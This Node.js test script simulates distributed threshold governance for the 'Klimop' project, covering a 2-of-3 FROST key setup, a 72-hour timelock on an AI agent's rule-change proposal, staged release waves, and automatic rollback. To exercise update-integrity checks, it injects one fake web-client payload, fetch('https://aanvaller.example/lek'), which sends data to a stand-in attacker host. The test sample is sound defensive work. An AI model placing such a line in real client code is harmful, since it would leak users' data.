#!/usr/bin/env node
// KLIMOP-007 (20.11.2026, Етап 6 Головного архітектурного маніфесту «Плющ» / «Klimop»):
// Відтворюваний сценарій полігона Етапу 6 (працює виключно локально на 127.0.0.1, без звернень до робочого сервера чи PostgreSQL):
//   1. Піднімає 4 незалежні вузли у 4 країнах і 4 постачальників (NL, CH, UA, SE) та проводить бездилерський DKG 2-з-3 ради керування (NL, CH, UA).
//   2. Блокує спробу передати владу випадковій більшості тимчасових вузлів і спробу затвердити зміну правил до спливу 72-годинного часового замка.
//   3. За карантинного вузла CH затверджує рішення пороговим підписом FROST силами NL + UA після спливу 72 год і перевіряє геш-пов'язаний журнал рішень.
//   4. Проводить 3-хвильове розгортання безпечного випуску v2 (NL -> CH + UA -> SE) зі збереженням міжхвильової сумісності версій v2 та v1 (§40).
//   5. Відбиває атаки захопленого каналу оновлень: відкочування до старої версії, заморожений штамп свіжості та підміну коду вебклієнта (§25, §40).
//   6. Автоматично зупиняє небезпечний випуск v3 на Хвилі 1 (NL), де програма запустилася, але порушено дозволи й витік секретів (§24):
//      Хвиля 1 повертається на v2, а вузли Хвиль 2 і 3 (CH, UA, SE) не зачіпаються взагалі!
// Запуск: node scripts/klimop-etappe6-bestuur-proef.mjs [--json]

import { build } from 'esbuild';
import { createHash, generateKeyPairSync } from 'node:crypto';
import { mkdir, mkdtemp, rm } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

function maakEd25519Sleutels() {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  return {
    publiekeSleutelDerB64u: publicKey.export({ type: 'spki', format: 'der' }).toString('base64url'),
    geheimeSleutelPkcs8B64u: privateKey.export({ type: 'pkcs8', format: 'der' }).toString('base64url'),
  };
}

async function voerEtappe6ProefUit() {
  await mkdir('rapporten', { recursive: true });
  const tijdelijkeMap = await mkdtemp(join('rapporten', 'klimop-etappe6-proef-'));
  const bundelPad = resolve(tijdelijkeMap, 'etappe6-bundel.mjs');

  try {
    await build({
      stdin: {
        contents: `
          export * from './shared/klimop/kern.ts';
          export * from './shared/klimop/stengels.ts';
          export * from './shared/klimop/drempelsleutels.ts';
          export * from './shared/klimop/bestuur.ts';
          export * from './backend/klimop-knooppunt-agent.ts';
          export * from './backend/klimop-drempel-client.ts';
          export * from './backend/klimop-bestuur-client.ts';
        `,
        resolveDir: process.cwd(),
        loader: 'ts',
      },
      bundle: true,
      format: 'esm',
      platform: 'node',
      target: 'node22',
      outfile: bundelPad,
    });

    const m = await import(pathToFileURL(bundelPad).href);
    const t0Ms = Date.parse('2026-11-20T20:40:00.000Z');
    const nuIso = new Date().toISOString();
    const verlooptOpIso = new Date(Date.now() + 30 * 24 * 3600 * 1000).toISOString();

    const knCoord = m.maakKlimopKnooppunt({
      type: 'persoonlijke_gebruikersapparaten',
      rollen: ['verificatie', 'herstel'],
      juridischeRegio: 'NL',
      aanbieder: 'persoonlijk-toestel-eigenaar',
      nuIso,
    });
    const knNL = m.maakKlimopKnooppunt({
      type: 'vaste_onafhankelijke_knooppunten',
      rollen: ['verificatie', 'verbinding'],
      juridischeRegio: 'NL',
      aanbieder: 'eigen-knoop-nl',
      nuIso,
    });
    const knCH = m.maakKlimopKnooppunt({
      type: 'vaste_onafhankelijke_knooppunten',
      rollen: ['verificatie', 'verbinding'],
      juridischeRegio: 'CH',
      aanbieder: 'alpen-knoop-ch',
      nuIso,
    });
    const knUA = m.maakKlimopKnooppunt({
      type: 'vaste_onafhankelijke_knooppunten',
      rollen: ['verificatie', 'verbinding', 'herstel'],
      juridischeRegio: 'UA',
      aanbieder: 'kyiv-knoop-ua',
      nuIso,
    });
    const knSE = m.maakKlimopKnooppunt({
      type: 'vaste_onafhankelijke_knooppunten',
      rollen: ['verificatie', 'opslag'],
      juridischeRegio: 'SE',
      aanbieder: 'nordic-knoop-se',
      nuIso,
    });
    const knTijdelijk = m.maakKlimopKnooppunt({
      type: 'tijdelijke_toetredingsknooppunten',
      rollen: ['verbinding'],
      juridischeRegio: 'DE',
      aanbieder: 'gast-knoop-de',
      nuIso,
    });

    const srvNL = await m.startKlimopProefKnooppunt({ knooppunt: knNL });
    const srvCH = await m.startKlimopProefKnooppunt({ knooppunt: knCH });
    const srvUA = await m.startKlimopProefKnooppunt({ knooppunt: knUA });
    const srvSE = await m.startKlimopProefKnooppunt({ knooppunt: knSE });

    try {
      const tabel = new m.KlimopRouteTabel();
      for (const s of [srvNL, srvCH, srvUA, srvSE]) {
        tabel.voegTweerichtingsStengelToe(knCoord.identiteit.knooppuntId, s.identiteit.knooppuntId, 1);
      }
      const adressen = new Map([
        [srvNL.identiteit.knooppuntId, srvNL.basisUrl],
        [srvCH.identiteit.knooppuntId, srvCH.basisUrl],
        [srvUA.identiteit.knooppuntId, srvUA.basisUrl],
        [srvSE.identiteit.knooppuntId, srvSE.basisUrl],
      ]);

      const netwerkClient = new m.KlimopNetwerkClient(knCoord, adressen, tabel);
      const drempelClient = new m.KlimopDrempelOndertekenaarClient(netwerkClient);
      const bestuurClient = new m.KlimopBestuurEnUitrolClient(netwerkClient, drempelClient);

      // 1. Бездилерський DKG 2-з-3 ради керування між NL, CH, UA
      const dkgUit = await drempelClient.voerNetwerkDkgUit({
        setId: 'bestuur-frost-001',
        opdrachtgever: knCoord,
        knooppunten: [knNL.identiteit, knCH.identiteit, knUA.identiteit],
        drempel: 2,
        nuIso,
        verlooptOpIso,
      });
      if (!dkgUit.ok) throw new Error(`Збій DKG ради керування: ${dkgUit.fout}`);

      // Заборона випадкової більшості тимчасових вузлів у конституції керування (§2, §19)
      const willekeurigeMeerderheidGeweigerd = !m.maakBestuursGrondwet({
        grondwetId: 'slechte-grondwet',
        frostSetId: 'bestuur-frost-001',
        frostGroepsPubliekeSleutelHex: dkgUit.groep.groepsPubliekeSleutelHex,
        drempel: 2,
        erkendeHoeders: [knNL.identiteit, knTijdelijk.identiteit],
      }).ok;

      const doelenRolSleutels = maakEd25519Sleutels();
      const tijdstempelRolSleutels = maakEd25519Sleutels();
      const vetoSleutels = maakEd25519Sleutels();

      const grondwetUit = m.maakBestuursGrondwet({
        grondwetId: 'klimop-grondwet-v1',
        versieVolgnummer: 1,
        frostSetId: 'bestuur-frost-001',
        frostGroepsPubliekeSleutelHex: dkgUit.groep.groepsPubliekeSleutelHex,
        drempel: 2,
        erkendeHoeders: [knNL.identiteit, knCH.identiteit, knUA.identiteit],
        overgangsNoodVetoPubDerB64u: vetoSleutels.publiekeSleutelDerB64u,
        nuIso: new Date(t0Ms).toISOString(),
      });
      if (!grondwetUit.ok) throw new Error(grondwetUit.fout);

      const omgUit = await bestuurClient.stelGrondwetOpNetwerkIn({
        netwerkId: 'bestuur-net-001',
        opdrachtgever: knCoord,
        grondwet: grondwetUit.grondwet,
        frostGroep: dkgUit.groep,
        knooppunten: [knNL.identiteit, knCH.identiteit, knUA.identiteit, knSE.identiteit],
        erkendeDoelenRolPubDerB64u: doelenRolSleutels.publiekeSleutelDerB64u,
        erkendeTijdstempelRolPubDerB64u: tijdstempelRolSleutels.publiekeSleutelDerB64u,
        nuIso,
        verlooptOpIso,
      });
      if (!omgUit.ok) throw new Error(omgUit.fout);

      // 2. Пропозиція ШІ-агента на зміну правил екосистеми: 0 год для щоденних дій користувача, але >= 72 год для правил!
      const dagelijkseWachttijdNul = m.STANDAARD_CATEGORIE_BELEID.eigen_gegevens_rechten.minimaleWachttijdUren === 0;
      const agentSleutels = maakEd25519Sleutels();
      const voorstelRegels = m.maakBestuursVoorstel({
        grondwet: grondwetUit.grondwet,
        categorie: 'ecosysteem_regels_wijziging',
        onderwerpSamenvatting: 'Оновлення параметрів кворуму екосистеми до v1.6.0',
        inhoudPayload: { doelRegelsVersie: '1.6.0' },
        indienerSoort: 'ai_agent',
        indienerId: 'agent:antigravity',
        indienerSleutels: agentSleutels,
        aangevraagdeWachttijdUren: 1, // спроба занизити до 1 год примусово піднімається до 72 год!
        nuIso: new Date(t0Ms).toISOString(),
      });

      const teVroegBesluit = await bestuurClient.bekrachtigVoorstelOpNetwerk({
        omgeving: omgUit.omgeving,
        bestaandLogboek: [],
        voorstel: voorstelRegels,
        bekrachtigdOp: new Date(t0Ms + 24 * 3600_000).toISOString(),
      });

      // Скомпрометований/недоступний один учасник (CH у карантині) не зупиняє кворумне керування (NL + UA підписують після 72 год!)
      tabel.plaatsInQuarantaine(knCH.identiteit.knooppuntId);
      const wettigBesluit = await bestuurClient.bekrachtigVoorstelOpNetwerk({
        omgeving: omgUit.omgeving,
        bestaandLogboek: [],
        voorstel: voorstelRegels,
        bekrachtigdOp: new Date(t0Ms + 73 * 3600_000).toISOString(),
      });
      if (!wettigBesluit.ok) throw new Error(wettigBesluit.fout);
      const logboekGeldig = m.verifieerBestuursBesluitLogboek(grondwetUit.grondwet, [wettigBesluit.besluit]).ok;
      const tijdslotEnFrostBestuurOk =
        dagelijkseWachttijdNul
        && voorstelRegels.wachttijdUren === 72
        && !teVroegBesluit.ok && teVroegBesluit.fout === 'BESTUUR_TIJDSLOT_NOG_NIET_VERSTREKEN'
        && wettigBesluit.ok && logboekGeldig;

      tabel.haalUitQuarantaine(knCH.identiteit.knooppuntId);

      // 3. Хвильове встановлення безпечного випуску v2 на всі 4 вузли (NL -> CH + UA -> SE)
      const pakketV2 = Buffer.from('klimop-pakket-archief-v2-inhoud', 'utf8');
      const webClientV2 = Buffer.from('console.log("klimop-webclient-v2-geverifieerd");', 'utf8');
      const sha256 = (s) => createHash('sha256').update(s, 'utf8').digest('hex');

      const bundelV2Uit = await bestuurClient.stelOndertekendeUitgaveBundelSamen({
        omgeving: omgUit.omgeving,
        versieLabel: '20261120-210000-v2',
        uitgaveVolgnummer: 2,
        minCompatibelVolgnummer: 1,
        pakketInhoud: pakketV2,
        webClientBundelInhoud: webClientV2,
        afhankelijkhedenBoomSha256: sha256('lockfile-v2'),
        bronCommitSha40: '72bc067577443de9385bcd24e23f27046767f076',
        ontwikkelarchiefSha256: sha256('ontwikkelarchief-klimop-007'),
        auteurSoort: 'menselijke_deelnemer',
        auteurId: 'klid1_eigenaar',
        doelenRolSleutels,
        tijdstempelRolSleutels,
        nuIso: new Date(t0Ms).toISOString(),
      });
      if (!bundelV2Uit.ok) throw new Error(bundelV2Uit.fout);

      const golven = [
        [knNL.identiteit.knooppuntId],
        [knCH.identiteit.knooppuntId, knUA.identiteit.knooppuntId],
        [knSE.identiteit.knooppuntId],
      ];
      const uitrolV2 = await bestuurClient.voerGefaseerdeUitrolUit({
        omgeving: omgUit.omgeving,
        bundel: bundelV2Uit.bundel,
        pakketInhoud: pakketV2,
        webClientBundelInhoud: webClientV2,
        golven,
        nuIso: new Date(t0Ms + 600_000).toISOString(),
      });
      const gefaseerdeUitrolV2Ok =
        uitrolV2.voltooid
        && uitrolV2.tussentijdseVersieCompatibiliteitOk
        && [srvNL, srvCH, srvUA, srvSE].every((s) => s.actiefUitgaveVolgnummer() === 2);

      // 4. Атаки захопленого засобу оновлень (§25, §40): відкочування назад, заморожений штамп і підміна вебклієнта
      const terugdraaiAanval = await bestuurClient.voerGefaseerdeUitrolUit({
        omgeving: omgUit.omgeving,
        bundel: bundelV2Uit.bundel, // volgnummer 2 при вже встановленому 2!
        pakketInhoud: pakketV2,
        webClientBundelInhoud: webClientV2,
        golven: [[knNL.identiteit.knooppuntId]],
        nuIso: new Date(t0Ms + 900_000).toISOString(),
      });

      const bundelV3Goed = await bestuurClient.stelOndertekendeUitgaveBundelSamen({
        omgeving: omgUit.omgeving,
        versieLabel: '20261120-220000-v3',
        uitgaveVolgnummer: 3,
        minCompatibelVolgnummer: 2,
        pakketInhoud: Buffer.from('klimop-pakket-archief-v3-inhoud', 'utf8'),
        webClientBundelInhoud: Buffer.from('console.log("klimop-webclient-v3");', 'utf8'),
        afhankelijkhedenBoomSha256: sha256('lockfile-v3'),
        bronCommitSha40: '72bc067577443de9385bcd24e23f27046767f076',
        ontwikkelarchiefSha256: sha256('ontwikkelarchief-v3'),
        auteurSoort: 'menselijke_deelnemer',
        auteurId: 'klid1_eigenaar',
        doelenRolSleutels,
        tijdstempelRolSleutels,
        nuIso: new Date(t0Ms).toISOString(),
        tijdstempelGeldigheidUren: 24,
      });
      if (!bundelV3Goed.ok) throw new Error(bundelV3Goed.fout);

      const bevrorenAanval = await bestuurClient.voerGefaseerdeUitrolUit({
        omgeving: omgUit.omgeving,
        bundel: bundelV3Goed.bundel,
        pakketInhoud: Buffer.from('klimop-pakket-archief-v3-inhoud', 'utf8'),
        webClientBundelInhoud: Buffer.from('console.log("klimop-webclient-v3");', 'utf8'),
        golven: [[knNL.identiteit.knooppuntId]],
        nuIso: new Date(t0Ms + 72 * 3600_000).toISOString(), // прострочений штамп свіжості!
      });

      const webClientVervalstAanval = await bestuurClient.voerGefaseerdeUitrolUit({
        omgeving: omgUit.omgeving,
        bundel: bundelV3Goed.bundel,
        pakketInhoud: Buffer.from('klimop-pakket-archief-v3-inhoud', 'utf8'),
        webClientBundelInhoud: Buffer.from('fetch("https://aanvaller.example/lek");', 'utf8'), // підміна JS вебклієнта!
        golven: [[knNL.identiteit.knooppuntId]],
        nuIso: new Date(t0Ms + 3600_000).toISOString(),
      });

      const gekaapteUitrolAfgeweerd =
        terugdraaiAanval.stopFout === 'UITGAVE_TERUGDRAAI_AANVAL_GEWEIGERD'
        && bevrorenAanval.stopFout === 'UITGAVE_TIJDSTEMPEL_BEVROREN_OF_VERLOPEN'
        && webClientVervalstAanval.stopFout === 'WEBCLIENT_BUNDEL_INTEGRITEIT_FOUT'
        && srvNL.actiefUitgaveVolgnummer() === 2;

      // 5. Небезпечний випуск v3 на Хвилі 1 (NL): процес запустився, але виявлено порушення дозволів і витік секретів (§24)
      const foutieveUitrolV3 = await bestuurClient.voerGefaseerdeUitrolUit({
        omgeving: omgUit.omgeving,
        bundel: bundelV3Goed.bundel,
        pakketInhoud: Buffer.from('klimop-pakket-archief-v3-inhoud', 'utf8'),
        webClientBundelInhoud: Buffer.from('console.log("klimop-webclient-v3");', 'utf8'),
        golven,
        gesimuleerdeMetingPerKnooppuntId: {
          [knNL.identiteit.knooppuntId]: {
            procesGestart: true, // сам факт запуску НЕ робить випуск успішним (§24 абз. 5)!
            gegevensIntegriteitOk: true,
            machtigingenGeldigOk: false,
            geenGeheimLekGedetecteerd: false,
          },
        },
        nuIso: new Date(t0Ms + 3600_000).toISOString(),
      });

      const automatischeStopEnTerugdraaiOk =
        !foutieveUitrolV3.voltooid
        && foutieveUitrolV3.status === 'automatisch_gestopt_en_teruggedraaid'
        && foutieveUitrolV3.voltooideGolven === 0
        && foutieveUitrolV3.nietAangeraakteKnooppuntIds.length === 3
        && srvNL.aantalUitgaveTerugdraaiingen() === 1
        && [srvNL, srvCH, srvUA, srvSE].every((s) => s.actiefUitgaveVolgnummer() === 2);

      netwerkClient.sluitAlleSessies();

      const resultaat = {
        code: 'KLIMOP-ETAPPE-6-BESTUUR-UITROL-PROEF',
        willekeurigeMeerderheidGeweigerd,
        tijdslotEnFrostBestuurOk,
        gefaseerdeUitrolV2Ok,
        gekaapteUitrolAfgeweerd,
        automatischeStopEnTerugdraaiOk,
      };

      if (process.argv.includes('--json')) {
        console.log(JSON.stringify(resultaat, null, 2));
      } else {
        console.log('KLIMOP Етап 6 · Розподілене порогове керування, часові замки та безпечні хвильові випуски');
        console.log(`  Заборона передавання влади випадковій більшості тимчасових вузлів (§2, §19): ok=${resultaat.willekeurigeMeerderheidGeweigerd}`);
        console.log(`  Часовий замок 72 год (при 0 год для щоденних дій) та рішення FROST 2-з-3 без CH: ok=${resultaat.tijdslotEnFrostBestuurOk}`);
        console.log(`  3-хвильове розгортання v2 на 4 вузли (NL, CH, UA, SE) із сумісністю сусідніх версій: ok=${resultaat.gefaseerdeUitrolV2Ok}`);
        console.log(`  Відбиття атак відкочування версії, замороженого штампа та підміни вебклієнта (§25): ok=${resultaat.gekaapteUitrolAfgeweerd}`);
        console.log(`  Автоматична зупинка й відкочування Хвилі 1 при порушенні дозволів/витоку секретів (§24): ok=${resultaat.automatischeStopEnTerugdraaiOk}`);
      }

      if (
        !willekeurigeMeerderheidGeweigerd
        || !tijdslotEnFrostBestuurOk
        || !gefaseerdeUitrolV2Ok
        || !gekaapteUitrolAfgeweerd
        || !automatischeStopEnTerugdraaiOk
      ) {
        process.exitCode = 1;
      }
    } finally {
      await Promise.all([srvNL.sluit(), srvCH.sluit(), srvUA.sluit(), srvSE.sluit()]);
    }
  } finally {
    await rm(tijdelijkeMap, { recursive: true, force: true });
  }
}

voerEtappe6ProefUit().catch((err) => {
  console.error('Збій полігона Етапу 6:', err);
  process.exitCode = 1;
});
